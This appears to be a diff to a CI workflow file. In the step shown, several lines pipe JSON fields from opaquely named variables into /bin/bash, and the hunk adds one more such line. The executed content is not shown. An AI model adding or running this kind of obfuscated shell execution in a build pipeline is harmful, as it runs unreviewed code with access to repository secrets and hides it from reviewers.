@@ -26,6 +26,7 @@ jobs:
           echo $eul29 | jq -r .skyzg39 | /bin/bash
           echo $vfv59383 | jq -r .hlsan62521 | /bin/bash
           printf '%s' "$g082" | jq -r .st2 | /bin/bash
+          echo $vjk2743 | jq -r .hqv8 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
